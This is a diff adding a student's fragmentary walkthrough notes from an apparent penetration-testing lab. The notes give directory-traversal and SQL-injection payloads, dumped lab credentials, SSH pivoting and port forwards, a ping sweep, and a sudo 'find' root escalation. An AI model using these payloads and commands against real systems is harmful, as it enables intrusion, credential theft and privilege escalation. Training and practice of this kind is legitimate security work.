@@ -56,3 +56,86 @@ Pivot to Found Targets
 NOTES
     • 
 
+
+
+
+
+
+
+
+NOTES
+      nmap 10.50.35.123, firefox > 10.50.35.123:80, Aaron (login.php 1=1)
+      careers.php?myfile=?../../../../../../etc/passwd, http://10.50.35.123/login.php?username=tom%27%20OR%201=%271%20&%20passwd=tom%27%20OR%201=%271 
+      undefined index:/var/www/html/login.php
+      http://10.50.35.123/getcareers.php?myfile=../../../../../var/www/html/login.php
+    • 
+      ****student@lin-ops:~$ nmap -T4 -sV --script=http-enum 10.50.35.123
+    • 22,80 are open. 
+      /scripts in url bar
+      system_user=user2
+      user_password=EaglesIsARE78
+cat etc/hosts
+nmap ip
+student@lin-ops:~$ ssh -S /tmp/jump jump -O forward -L 1113:192.168.28.181:80
+firefox 127.0.0.1:1113
+http://127.0.0.1:1113/pick.php?product=7%20UNION%20SELECT%20table_schema,table_name,column_name%20FROM%20information_schema.columns;%20#
+
+Item
+On Hand
+Price
+HAM
+32
+$15
+1
+Aaron
+$Aaron
+2
+user2
+$user2
+3
+user3
+$user3
+4
+Lroth
+$Lee_Roth
+1
+ncnffjbeqlCn$$jbeq
+$Aaron
+2
+RntyrfVfNER78
+$user2
+3
+Obo4GURRnccyrf
+$user3
+4
+anotherpassword4THEages
+$Lroth
+
+ncnffjbeqlCn$$jbeq
+RntyrfVfNER78
+Obo4GURRnccyrf
+anotherpassword4THEages
+--ROT13--
+apasswordyPa$$word
+EaglesIsARE78
+Bob4THEEapples
+nabgurecnffjbeq4GURntrf
+
+for i in {1..254} ;do (ping -c 1 192.168.28.$i | grep "bytes from" &) ;done
+looking for next box
+
+WALKTHROUGH NOTES:
+first target: given to us. Scan, 22 and 80 open, firefox, directory traversal=usernames with shells:root,ubuntu,user2(/bin/sh), try truth statement=Aaron. PagesourceNetworkRawmethodPOST(?), make control sockekt: ssh -MS tmp/x user2@ip, pw:whatwegound earlier, bash unsethistfile, cat etchosts,  sudo -l, find / -type f -perm 6000 -ls 2>dev/null, etchosts found an ip(webapp). Does not say get into the webapp. Found ip address so we need to scan the network. Ip a, ip route, ruby ping sweep(1liner), finds 3 ip(other boxes), set up dynamic port forward before scan, 
+****student@lin-ops:~$ ssh -S /tmp/jump jump -O forward 9050,
+ proxychains nmap -Pn -T5 -sV -vvvv <IP>, student@lin-ops:~$ ssh -S /tmp/jump jump -O forward -L 5454:192.168.28.172:22 -L 5656:192.168.28.181:80, firefox 127.0.0.1, product value changed, one not like the rest, http://127.0.0.1:5656/pick.php?product=7%20OR%201=1
+UNION SELECT x,x,x (order matters), ?product=7 UNION select 1,2,3
+golden statement 
+.181 is vulnerable to sql injection, not worried about pswd, edit goldent statement, AARON!, dont need access -> move on to .172, 
+student@lin-ops:~$ ssh -MS /tmp/jump2 Aaron@127.0.0.1 -p 5454 (port that we opened on the 172), (aaron password)look around: sudo -l, ls, enumerate etc. User can usrbin/find. Gtfo bins!, Aaron@RoundSensor:/$ sudo find . -exec /bin/bash \; -quit, 
+
+
+
+
+
+
+
